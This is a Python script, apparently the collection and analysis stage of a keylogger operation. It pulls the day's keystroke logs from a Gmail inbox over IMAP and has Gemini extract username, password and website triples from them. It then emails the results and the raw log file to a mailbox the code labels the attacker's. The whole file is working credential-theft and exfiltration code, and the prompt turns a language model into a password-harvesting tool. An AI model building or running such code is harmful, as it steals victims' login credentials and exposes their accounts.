"""
Module: Daily Aggregator & Analyzer
Description: 
    1. Connects to raw logs receiver mail.
    2. Fetches logs received from Mail 1 today.
    3. Aggregates data into a single file.
    4. Uses Gemini to extract credentials.
    5. Forwards the Intelligence Report to Mail 3.
"""

from google import genai  
from email_service import EmailService
import config
import imaplib
import email
import datetime
import os

def fetch_todays_logs():
    """
    Connects to raw logs receiver mail and fetches all logs sent by 
    raw logs sender mail since the start of the day.
    """
    print(f"[*] Connecting to raw logs receiver mail ({config.RAW_LOG_RECEIVER}) via IMAP...")
    
    try:
        
        mail = imaplib.IMAP4_SSL("imap.gmail.com")
        
        mail.login(config.RAW_LOG_RECEIVER, config.RAW_LOG_RECEIVER_PASSWORD)
        mail.select("inbox")
        
       
        today_str = datetime.date.today().strftime("%d-%b-%Y")
        
        # SEARCH CRITERIA: 
        # FROM: Mail 1 
        # SUBJECT: "Security Project Log Update"
        # SINCE: Today
        search_criteria = f'(FROM "{config.RAW_LOG_SENDER}" SUBJECT "Security Project Log Update" SINCE "{today_str}")'
        status, messages = mail.search(None, search_criteria)
        
        email_ids = messages[0].split()
        print(f"[*] Found {len(email_ids)} log emails from today.")
        
        aggregated_logs = ""
        
        # Parse emails
        for e_id in email_ids:
            _, msg_data = mail.fetch(e_id, "(RFC822)")#RFC822: Format of email message structure
            for response_part in msg_data:
                if isinstance(response_part, tuple):
                    msg = email.message_from_bytes(response_part[1])
                    
                    if msg.is_multipart():#e.g text and file attached
                        for part in msg.walk():
                            if part.get_content_type() == "text/plain":
                                body = part.get_payload(decode=True).decode()
                                aggregated_logs += body + "\n"
                    else:
                        body = msg.get_payload(decode=True).decode()
                        aggregated_logs += body + "\n"
        
        mail.logout()
        return aggregated_logs

    except Exception as e:
        print(f"[Error] IMAP Fetch failed: {e}")
        return ""

def run_daily_routine():
    # SETUP API 
    if not hasattr(config, 'API_KEY') or not config.API_KEY:
        print("[Error] API_KEY is missing in config.py")
        return
        
    try:
        # Initialize Client
        client = genai.Client(api_key=config.API_KEY)
    except Exception as e:
        print(f"[Error] Failed to configure AI: {e}")
        return

    #  FETCH LOGS
    raw_data = fetch_todays_logs()
    
    if not raw_data:
        print("[!] No logs found for today. Exiting.")
        return

    # CREATE CENTRALIZED LOG FILE
    filename = f"Daily_Log_{datetime.date.today()}.txt"
    with open(filename, "w", encoding="utf-8") as file:
        file.write(raw_data)
    print(f"[*] Generated Centralized Log File: {filename}")

    # DEFINE PROMPT
    prompt = f"""
        You are a Forensic Credential Analyst. 
        Analyze the raw keylogger data below to identify login attempts.
        
        Your Goal: Match usernames to their corresponding passwords and websites.
        
        Strictly output the findings in this format for each set of credentials found:
        ---------------------------------------------------
        1. **Service:** [Website URL or Application Name]
        **Username/ID:** [The email or username typed]
        **Password:** [The password matched to this user]
        ---------------------------------------------------
        
        Rules:
        - If you see a username typed, look immediately after it for the password.
        - Ignore navigation keys like [TAB], [ENTER], [BACKSPACE] in the final output (clean them up).
        - If you are not 100% sure a password belongs to a user, mark it as "Uncertain".
        - If no credentials are found, output ONLY: "No credentials detected."

        RAW DATA START:
        {raw_data[:30000]} 
        RAW DATA END
        
        If no credentials are found, simply state "No credentials detected."
        """
    
    # GENERATE & SEND 
    print("[*] Running AI Analysis...")
    try:

        response = client.models.generate_content(model='gemini-2.5-flash' , contents=prompt)
        analysis_text = response.text
        
        
        mailer = EmailService(config.RAW_LOG_RECEIVER, config.RAW_LOG_RECEIVER_PASSWORD)
        
        subject = f"Daily Intelligence Report - {datetime.date.today()}"
        
        print(f"[*] Sending Report to Attacker Email ({config.FINAL_REPORT_RECEIVER})...")
        
        # Send to Mail 3 (Attacker)
        success = mailer.send_email(
            receiver_email=config.FINAL_REPORT_RECEIVER,
            subject=subject,
            body=analysis_text,
            attachment_path=filename
        )
        
        if success:
            print("[*] Daily Routine Complete! Email sent.")
        
        # Cleanup
        if os.path.exists(filename):
            os.remove(filename)

    except Exception as e:
        print(f"[Error] Routine failed: {e}")

if __name__ == "__main__":
    run_daily_routine()